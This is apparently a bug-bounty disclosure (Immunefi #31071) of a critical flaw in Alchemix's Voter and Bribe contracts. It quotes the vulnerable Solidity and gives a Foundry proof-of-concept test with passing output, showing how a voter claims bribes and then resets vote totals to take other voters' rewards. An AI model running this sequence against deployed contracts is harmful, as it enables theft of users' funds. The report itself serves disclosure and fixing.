# 31071 - \[SC - Critical] User can steal bribes and prevent other users f...

Submitted on May 12th 2024 at 08:42:33 UTC by @imsrybr0 for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31071

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol>

Impacts:

* Theft of unclaimed yield

## Description

## Brief/Intro

User can steal bribes and prevent other users from claiming theirs.

## Vulnerability Details

```solidity
// ...
contract Voter is IVoter {
	// ...
    function claimBribes(address[] memory _bribes, address[][] memory _tokens, uint256 _tokenId) external {
        require(IVotingEscrow(veALCX).isApprovedOrOwner(msg.sender, _tokenId));

        for (uint256 i = 0; i < _bribes.length; i++) {
            IBribe(_bribes[i]).getRewardForOwner(_tokenId, _tokens[i]); // <==== Audit
        }
    }

    function distribute() external {
        uint256 start = 0;
        uint256 finish = pools.length;

        for (uint256 x = start; x < finish; x++) {
            // We don't revert if gauge is not alive since pools.length is not reduced
            if (isAlive[gauges[pools[x]]]) {
                _distribute(gauges[pools[x]]); // <==== Audit
            }
        }

        IMinter(minter).updatePeriod();
    }

    function _distribute(address _gauge) internal {
        // Distribute once after epoch has ended
        require(
            block.timestamp >= IMinter(minter).activePeriod() + IMinter(minter).DURATION(),
            "can only distribute after period end"
        );

        uint256 _claimable = claimable[_gauge];

        // Reset claimable amount
        claimable[_gauge] = 0;

        _updateFor(_gauge);

        if (_claimable > 0) {
            IBaseGauge(_gauge).notifyRewardAmount(_claimable);
        }

        IBribe(bribes[_gauge]).resetVoting(); // <==== Audit

        emit DistributeReward(msg.sender, _gauge, _claimable);
    }
	// ...
}
```

```solidity
// ...
contract Bribe is IBribe {
	// ...
	function getRewardForOwner(uint256 tokenId, address[] memory tokens) external lock {
        require(msg.sender == voter, "not voter");
        address _owner = IVotingEscrow(veALCX).ownerOf(tokenId);
        uint256 length = tokens.length;
        for (uint256 i = 0; i < length; i++) {
            uint256 _reward = earned(tokens[i], tokenId);

            require(_reward > 0, "no rewards to claim");

            lastEarn[tokens[i]][tokenId] = block.timestamp;

            _writeCheckpoint(tokenId, balanceOf[tokenId]); // <==== Audit

            IERC20(tokens[i]).safeTransfer(_owner, _reward);

            emit ClaimRewards(_owner, tokens[i], _reward);
        }
    }

	function resetVoting() external {
        require(msg.sender == voter);
        totalVoting = 0; // <==== Audit
    }
	// ...
}
```

`Voter@distribute` resets the total votes to 0 on the given `Gauge` corresponding `Bribe` and doesn't trigger a voting checkpoint. It also doesn't change the individual user balances and total supply causing `Bribe` and `Voter` to be out of sync until all previous voter vote again.

Additionally, `Voter@claimBribes` triggers a checkpoint for the given token id.

Combined, they allow for situation where a user :

* Votes in Epoch N
* In Epoch N + 1 :
  * Does not vote.
  * Calls `Voter@claimBribes` to claim any bribes from Epoch N, triggering a checkpoint and activating rewards for this epoch (.i.e Epoch N + 1, claimable in Epoch N + 2).
  * Calls `Voter@distribute` to reset total votes. Rewards will now be calculated based on new voters, but still distributed to everyone with a checkpoint.
* User can keep claiming a share of bribes in future epochs at the expense of other voters.

## Impact Details

The impact of this issue will vary based on the participating voters voting power and the pool allocations and can span from rewards being fully stolen to partially stolen and preventing all / some users from claiming theirs because of a lack of funds to cover their shares.

## References

* <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Voter.sol#L332-L380>
* <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/Bribe.sol>

## Proof of Concept

```solidity
    function testStealBribes() public {
        uint256 tokenId1 = createVeAlcx(admin, 2 * TOKEN_1, MAXTIME, false);

        Bribe sushiGaugeBribe = Bribe(voter.bribes(address(sushiGauge)));
        address sushiGaugeBribeToken = sushiGaugeBribe.rewards(0);

        address[] memory pools = new address[](1);
        pools[0] = sushiPoolAddress;
        uint256[] memory weights = new uint256[](1);
        weights[0] = 1;

        // Notify rewards to sushi bribe
        createThirdPartyBribe(address(sushiGaugeBribe), sushiGaugeBribeToken, TOKEN_1);

        skip(1 days);
        // Vote for tokendId1
        hevm.prank(admin);
        voter.vote(tokenId1, pools, weights, 0);

        // Go to next epoch
        hevm.warp(newEpoch());

        address[] memory bribes = new address[](1);
        bribes[0] = address(sushiGaugeBribe);
        address[][] memory tokens = new address[][](1);
        tokens[0] = new address[](1);
        tokens[0][0] = sushiGaugeBribeToken;

        // admin claims Bribe rewards from previous epoch.
        // This calls Bribe@getRewardForOwner setting lastEarn time for the given token and triggering a new checkpoint for that token.
        // admin gets all the rewards as he is the only who voted in the previous epoch.
        hevm.prank(admin);
        voter.claimBribes(bribes, tokens, tokenId1);

        skip(1 days);
        // Distribute gauge rewards
        // This calls Bribe@resetVoting which set totalVoting to 0 in that Bribe without triggering a voting checkpoint.
        voter.distribute();

        skip(1 days);
        // Notify rewards to sushi bribe again
        createThirdPartyBribe(address(sushiGaugeBribe), sushiGaugeBribeToken, TOKEN_1);

        // Two other users now vote in this epoch.
        // This call Bribe@deposit (amongst other calls) and triggers new token, voting and supply checkpoints.
        // If no other users vote here, admin will just get the full bribe rewards.
        uint256 tokenId2 = createVeAlcx(beef, TOKEN_1, MAXTIME, false);
        uint256 tokenId3 = createVeAlcx(dead, TOKEN_1, MAXTIME, false);

        hevm.prank(beef);
        voter.vote(tokenId2, pools, weights, 0); 

        hevm.prank(dead);
        voter.vote(tokenId3, pools, weights, 0); 

        // Go to next epoch
        hevm.warp(newEpoch());

        // All 3 users can claim rewards.
        // However, rewards are not distributed equaly as it would be the case if all of them voted. 
        // totalVoted only accounts for two voters, so rewards will only be split in two.
        // If X is the amount of reward :
        console2.log(sushiGaugeBribe.earned(sushiGaugeBribeToken, tokenId1)); // Can get aproximately X because admin has double the veALCX voting power in this case
        console2.log(sushiGaugeBribe.earned(sushiGaugeBribeToken, tokenId2)); // Can get X / 2
        console2.log(sushiGaugeBribe.earned(sushiGaugeBribeToken, tokenId3)); // Can get X / 2

        hevm.prank(admin);
        voter.claimBribes(bribes, tokens, tokenId1);

        // This will fail as there are not enough rewards left in this case
        hevm.prank(beef);
        vm.expectRevert();
        voter.claimBribes(bribes, tokens, tokenId2);

        hevm.prank(dead);
        vm.expectRevert();
        voter.claimBribes(bribes, tokens, tokenId3);
    }
```

## Results

```console
Ran 1 test for src/test/Voting.t.sol:VotingTest
[PASS] testStealBribes() (gas: 6893490)
Logs:
  994217758672975468
  500000000000000000
  500000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 88.42s (70.90s CPU time)

Ran 1 test suite in 90.33s (88.42s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
